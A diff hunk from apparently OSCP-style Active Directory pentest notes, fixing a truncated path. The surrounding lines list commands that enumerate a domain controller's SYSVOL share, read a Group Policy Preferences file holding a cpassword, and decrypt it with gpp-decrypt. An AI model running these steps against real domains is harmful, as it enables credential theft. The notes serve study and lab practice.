@@ -2358,7 +2358,7 @@ Reference
   - Listing contents of the SYSVOL share (%SystemRoot%\SYSVOL\Sysvol\domain-name) > policies, scripts  
     `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\`
   - Listing contents of the "SYSVOL\policies share" > oldpolicy  
-    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Poli`
+    `PS C:\Tools> ls \\dc1.corp.com\sysvol\corp.com\Policies`
   - Checking contents of old-policy-backup.xml file > cpassword="+bsY0..."  
     `PS C:\Tools> cat \\dc1.corp.com\sysvol\corp.com\Policies\oldpolicy\old-policy-backup.xml`  
   - Using gpp-decrypt to decrypt the password > P@$$w0rd  
